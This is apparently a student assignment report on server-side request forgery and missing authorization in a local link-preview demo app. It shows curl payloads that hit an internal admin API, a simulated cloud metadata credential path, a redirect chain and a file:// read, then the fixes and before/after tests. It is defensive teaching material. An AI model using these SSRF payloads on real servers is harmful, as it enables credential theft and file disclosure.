# SSRF + Access Control

**Module:** WEB404 Secure Coding Practices - Assignment 3 (Topic 3)
**Author:** waangmo22@gmail.com
**Artefacts:** `internal/service.py`, `vulnerable/app.py`, `fixed/app.py`, `exploits/*`, `evidence/demo-output.txt`

---

## 1. Summary

"LinkPeek" is a link-preview feature: a user pastes a URL, the **server**
fetches it and returns a status code, content type, and a text snippet - the
same pattern chat apps and social platforms use to render link previews. The
server-side fetch is exactly the SSRF (Server-Side Request Forgery) attack
surface: whatever the server can reach, an attacker who controls the URL can
make it reach on their behalf, regardless of what the attacker themselves can
reach directly over the network.

This report demonstrates **five** checks against the vulnerable build:

| # | Check | What it abuses | Impact demonstrated |
| - | ----- | --------------- | -------------------- |
| 1 | Internal admin API | Server can reach an address the public can't | Leak a private-network admin API's secrets |
| 2 | Cloud metadata | Same, against a metadata-shaped endpoint | Steal simulated cloud instance credentials |
| 3 | Redirect-chained SSRF | Redirects followed automatically | Reach the internal API via an "allowed-looking" URL |
| 4 | `file://` scheme | No scheme restriction | Read a local file off the server's disk |
| 5 | No authorization | Feature usable with no login | Anonymous, unaccountable use of the fetcher |

`fixed/app.py` keeps the identical feature and adds four independent
controls. After the fix **all five checks are blocked** (section 6,
`evidence/demo-output.txt`).

---

## 2. Environment note - how the "internal network" is simulated

Everything in this assignment runs on one machine, so there's no real network
boundary to cross. Two things stand in for it, both started by
`internal/service.py`:

* **`127.0.0.1:7099`** - an "internal admin API" plus a path shaped like the
  real AWS EC2 metadata service. In a real deployment this would sit on a
  private subnet or be firewalled to only accept connections from the app
  server itself; here it just represents "a resource only the app server, not
  the public, is supposed to reach."
* **`127.0.0.2:7050`** - an "external site" the fetch feature is legitimately
  allowed to reach, standing in for the wider internet. `127.0.0.1` and
  `127.0.0.2` are both loopback (the whole `127.0.0.0/8` block routes locally
  on Linux, confirmed with `python3 -c "import socket; print(socket.getaddrinfo('127.0.0.2', 80))"`),
  so no `/etc/hosts` edits or root access are needed.

**Real cloud metadata** lives at `169.254.169.254`, a link-local address
(`169.254.0.0/16`, RFC 3927) that is only reachable from the host itself -
binding a demo service to it would require adding the address to a network
interface, which needs root and modifies the machine's network configuration,
so this assignment does not do that. Section 5.1 shows that the fixed build's
IP check rejects that real address too, by class (`is_link_local`), without
needing to bind it: `ipaddress.ip_address("169.254.169.254").is_link_local`
evaluates to `True`.

---

## 3. Vulnerability mechanism

`vulnerable/app.py`, `fetch_preview()`:

```python
def fetch_preview(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=5) as resp:
        ...
```

That is the entire security-relevant logic. Four separate gaps, each mapped
to one exploitation technique:

| Gap | Exploited by | CWE |
| --- | --- | --- |
| No destination check (any hostname/IP is fetched) | Technique 1, 2 | CWE-918 (Server-Side Request Forgery) |
| Redirects followed automatically (`urlopen()` default) | Technique 3 | CWE-918 |
| No scheme check (`file://` works exactly like `http://`) | Technique 4 | CWE-918 / CWE-73 (External Control of File Name or Path) |
| No authorization on `/preview` | Technique 5 | CWE-862 (Missing Authorization) |

This is OWASP **A10:2021 - Server-Side Request Forgery**, plus **A01:2021 -
Broken Access Control** for the missing authorization.

---

## 4. Exploitation walkthrough

Setup:

```bash
cd Assigments/Assigment_3
python3 internal/service.py    # :7099 internal, :7050 external
python3 vulnerable/app.py      # http://127.0.0.1:7001
```

All requests below are wired into `exploits/0X-*.sh`. Run everything at once
with `bash exploits/run-demo.sh`. For the marked screenshots, replay the same
requests in Burp Suite Repeater (see `evidence/README.md`).

### 4.1 Technique 1 - direct SSRF to an internal admin API

```bash
curl -s http://127.0.0.1:7001/preview \
  --data-urlencode "url=http://127.0.0.1:7099/internal/admin"
```

**Observed result:**

```json
{
  "requested_url": "http://127.0.0.1:7099/internal/admin",
  "final_url": "http://127.0.0.1:7099/internal/admin",
  "status": 200,
  "content_type": "application/json",
  "snippet": "{\n  \"service\": \"internal-admin-api\", ... \"db_password\": \"Cluster_Root_Pw!2024\", ...}"
}
```

The attacker never touches `127.0.0.1:7099` directly - the **app server**
does, on their behalf, because the app server (unlike an outside attacker in
a real deployment) can already reach it.

**Tools:** `exploits/01-internal-admin.sh`; Burp Repeater. Screenshot:
`evidence/01-internal-vuln.png`.

### 4.2 Technique 2 - cloud metadata credential theft

```bash
curl -s http://127.0.0.1:7001/preview \
  --data-urlencode "url=http://127.0.0.1:7099/latest/meta-data/iam/security-credentials/webapp-role"
```

**Observed result:** a JSON body containing `AccessKeyId`, `SecretAccessKey`,
and a session `Token` - the shape of the real AWS Instance Metadata Service
response. This is the exact pattern behind the 2019 Capital One breach: an
SSRF-vulnerable fetcher was used to request the metadata endpoint of the EC2
instance it ran on, and the returned temporary IAM credentials were then used
to access and exfiltrate data from S3. The impact of an SSRF bug on a real
cloud host is very rarely "read one internal webpage" - it is routinely
"obtain valid cloud credentials for the whole account."

**Tools:** `exploits/02-cloud-metadata.sh`; Burp Repeater. Screenshot:
`evidence/02-metadata-vuln.png`.

### 4.3 Technique 3 - redirect-chained SSRF

```bash
curl -s http://127.0.0.1:7001/preview \
  --data-urlencode "url=http://127.0.0.2:7050/bounce"
```

`127.0.0.2:7050/bounce` returns `302 Found` with
`Location: http://127.0.0.1:7099/internal/admin`. `urlopen()` follows that
redirect automatically, so:

**Observed result:**

```json
{
  "requested_url": "http://127.0.0.2:7050/bounce",
  "final_url": "http://127.0.0.1:7099/internal/admin",
  "status": 200,
  "snippet": "{... \"db_password\": \"Cluster_Root_Pw!2024\" ...}"
}
```

`final_url` shows the fetch ended up somewhere completely different from what
was submitted. This matters even for a filter that *does* check the
destination: a real link-preview feature must accept arbitrary public
internet URLs (that is the entire point of the feature), so an IP allow-list
alone would approve `127.0.0.2:7050` as "fine, it's a public site" and never
look at where its redirect leads. **Validating the submitted URL is not the
same as validating the URL that is actually fetched.**

*A note on this sandbox specifically:* here, `127.0.0.2` is itself loopback,
so the fixed build's IP check (section 5) rejects it too, before any redirect
is even attempted - both controls independently stop this exact request, and
the full-stack test on its own doesn't prove the no-redirect control is doing
anything beyond what the IP check already does. `exploits/03b-redirect-handler-proof.py`
isolates it: it calls the fixed build's fetch opener directly, skipping the
IP check entirely, against the same redirecting URL, and confirms the opener
refuses the `302` on its own:

```
RESULT  : refused to follow -> HTTPError 302, Location header was: http://127.0.0.1:7099/internal/admin
```

That is the behaviour that matters in production, where the initial host
genuinely is public and allowed.

**Tools:** `exploits/03-redirect-bypass.sh`, `exploits/03b-redirect-handler-proof.py`;
Burp Repeater (send the request, observe the 302, then repeat with "follow
redirects" on to see the final response). Screenshot:
`evidence/03-redirect-vuln.png`.

### 4.4 Technique 4 - local file disclosure via `file://`

```bash
curl -s http://127.0.0.1:7001/preview --data-urlencode "url=file:///etc/hostname"
```

**Observed result:**

```json
{"requested_url": "file:///etc/hostname", "status": null, "content_type": "text/plain", "snippet": "kali\n"}
```

`urllib.request.urlopen()` supports the `file://` scheme out of the box. A
feature that only ever expected `http(s)://` links silently becomes a way to
read arbitrary files the server process can access (`/etc/passwd`, config
files with embedded credentials, source code, etc.) - a related, scheme-level
variant of the same underlying bug: the fetcher reaches a resource it was
never meant to reach.

**Tools:** `exploits/04-file-scheme.sh`; Burp Repeater. Screenshot:
`evidence/04-file-vuln.png`.

### 4.5 Technique 5 - missing authorization

```bash
curl -s http://127.0.0.1:7001/preview --data-urlencode "url=http://127.0.0.2:7050/"
# no Authorization header at all
```

**Observed result:** `200 OK`, the page is fetched normally. There is no
login on this build at all, so the feature is not just vulnerable to SSRF -
it is an **anonymous** SSRF proxy. Anyone who can reach the app (not just a
registered user) can use it to scan or pivot into internal infrastructure,
with no account to trace the activity back to and no way to rate-limit or
disable it per user.

**Tools:** `exploits/05-auth-required.sh`; Burp Repeater (remove the
`Authorization` header from a captured request). Screenshot:
`evidence/05-auth-vuln.png`.

---

## 5. Remediation

`fixed/app.py` is a line-for-line hardening of `vulnerable/app.py`. Inspect
it with `diff -u vulnerable/app.py fixed/app.py`.

### 5.1 Destination validation by resolved IP, not hostname string

```python
def is_public_address(ip_str: str) -> bool:
    ip = ipaddress.ip_address(ip_str)
    return not (
        ip.is_private or ip.is_loopback or ip.is_link_local
        or ip.is_reserved or ip.is_multicast or ip.is_unspecified
    )

def validate_url(url: str) -> None:
    parsed = urllib.parse.urlparse(url)
    ...
    for ip in resolve_all_ips(parsed.hostname, port):
        if not is_public_address(ip):
            raise SSRFBlocked(...)
```

This resolves the hostname with `socket.getaddrinfo()` and checks **every**
returned address (IPv4 and IPv6) against the well-known non-public ranges.
Checking the *numeric* address instead of string-matching the hostname is
what makes this robust: `127.0.0.1`, `127.1`, `2130706433`, and `0x7f000001`
are four different strings but the exact same address once resolved (verified
on this system: all four resolve to `('127.0.0.1', ...)`), so a naive
filter like `if host in ("127.0.0.1", "localhost"): block` is trivial to
bypass with any of the others, while a numeric check treats them identically.
The same logic covers the real cloud metadata address for free: `169.254.0.0/16`
is link-local, so `is_link_local` rejects `169.254.169.254` without needing a
special case for it.

**Blocks Techniques 1 and 2.** Observed: `{"error": "'127.0.0.1' resolves to non-public address 127.0.0.1"}`.

### 5.2 No automatic redirects

```python
class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None

_opener = urllib.request.build_opener(NoRedirect)
```

Any `3xx` response is now surfaced to the caller as an `HTTPError`, never
followed. The server only ever issues the one request the (now-validated)
URL named - never a second one to wherever that response's `Location` header
points.

**Blocks Technique 3** (see section 4.3 for why the isolated proof matters
here, not just the full-stack one). Observed:
`refused to follow -> HTTPError 302`.

### 5.3 Scheme allow-list

```python
ALLOWED_SCHEMES = {"http", "https"}
...
if parsed.scheme not in ALLOWED_SCHEMES:
    raise SSRFBlocked(f"scheme '{parsed.scheme}' is not allowed (only http/https)")
```

Checked first, before any resolution or connection is attempted.

**Blocks Technique 4.** Observed: `{"error": "scheme 'file' is not allowed (only http/https)"}`.

### 5.4 Authorization

```python
if parsed_path == "/preview":
    token = bearer_token(self.headers.get("Authorization"))
    if token not in SESSIONS:
        self._json(401, {"error": "login required"})
        return
```

A session, obtained from `POST /login`, is now required before the fetch
feature will run at all.

**Blocks Technique 5.** Observed: `{"error": "login required"}`.

### 5.5 Further hardening (noted, not required by the brief)

* **Re-validate on every redirect hop** instead of refusing all redirects, if
  following them is a hard product requirement - re-run `validate_url()`
  against the `Location` header before each hop, with a hop limit.
* **Domain allow-listing** is the right primary control for a feature with a
  *known, small* set of legitimate destinations - a webhook tester that only
  ever needs to reach the customer's own registered endpoint, for example.
  It is the wrong primary control for a general-purpose link previewer, whose
  entire job is to fetch arbitrary public URLs; IP-range validation (5.1) is
  what actually does the work there, which is why it is the primary control
  in this build.
* **Response size caps and stricter timeouts** (already present here via
  `SNIPPET_LEN` and `timeout=5`) reduce the value of the fetcher as a
  port-scanning or resource-exhaustion tool even for allowed destinations.
* **Network-level egress filtering** (a firewall rule on the app server
  itself denying outbound connections to RFC 1918 / loopback / link-local
  ranges) as a second, independent layer beneath the application-level check.

---

## 6. Verification - proof the exploits no longer work

`bash exploits/run-demo.sh` runs every check against the vulnerable build
(:7001, no login) and the fixed build (:7002, logged in). Full transcript:
`evidence/demo-output.txt`.

| Technique | vs vulnerable `:7001` | vs fixed `:7002` |
| --- | --- | --- |
| 1 - internal admin | `LEAKED internal admin secrets via the app server` | `resolves to non-public address 127.0.0.1` |
| 2 - cloud metadata | `STOLE simulated cloud credentials via the app server` | `resolves to non-public address 127.0.0.1` |
| 3 - redirect chain | `FOLLOWED the redirect ... -> leaked secrets` | blocked (IP check); isolated proof: `refused to follow -> HTTPError 302` |
| 4 - `file://` scheme | `READ a local file through the URL fetcher` | `scheme 'file' is not allowed` |
| 5 - no authorization | `ALLOWED unauthenticated use of the fetch feature` | `login required` |

Screenshots: `evidence/0X-*-fixed.png` and `evidence/diff.png`.

---

## 7. Why the fix works

Each control removes a specific assumption the vulnerable code made about its
input:

* **Techniques 1 & 2** relied on the server treating the submitted string as
  trustworthy without ever asking "where does this actually point?" Resolving
  it and checking the *numeric* result closes that gap for every possible
  spelling of a non-public address at once, not just the ones a developer
  thought to list.
* **Technique 3** relied on "validate once, then trust whatever happens
  next." Refusing to follow redirects removes the "next" - there is no second,
  unvalidated request for a `Location` header to redirect into.
* **Technique 4** relied on the fetcher supporting more than the one scheme
  the feature was designed for. An allow-list makes the supported surface
  exactly as wide as the feature's actual purpose, no wider.
* **Technique 5** relied on the endpoint having no concept of "who is asking."
  Requiring a session turns an anonymous action into an attributable one, and
  makes it possible to revoke, rate-limit, or audit per user - independent of
  whether the SSRF bugs above are also fixed.

None of these controls depend on guessing the attacker's next trick; each one
closes a specific code path the server itself would otherwise take.

---

## 8. Mapping to learning outcomes

| LO | Where addressed |
| --- | --- |
| LO2 - attack mechanisms | section 3 (mechanism), section 4 (five techniques executed) |
| LO5 - assess effectiveness of fixes | section 6 (before/after matrix), `run-demo.sh` re-tests every exploit |
| LO6 - secure development | section 5 (IP validation, no-redirect, scheme allow-list, authorization), `fixed/app.py` |

This topic maps to syllabus sections 3.4-3.6, which the module descriptor
notes has no other dedicated practical assessment.

## 9. References

* OWASP Top 10 2021 - **A10:2021 Server-Side Request Forgery**, **A01:2021
  Broken Access Control**.
* OWASP **SSRF Prevention Cheat Sheet** - allow-list validation by resolved
  IP, denying redirects, and restricting schemes as primary controls.
* MITRE **CWE-918** (SSRF), **CWE-862** (Missing Authorization), **CWE-73**
  (External Control of File Name or Path).
* AWS security bulletin and public post-incident reporting on the 2019
  Capital One breach - the canonical real-world example of SSRF-to-metadata
  credential theft referenced in section 4.2.

## Appendix - full demo transcript

See `evidence/demo-output.txt` (regenerate with `bash exploits/run-demo.sh`).
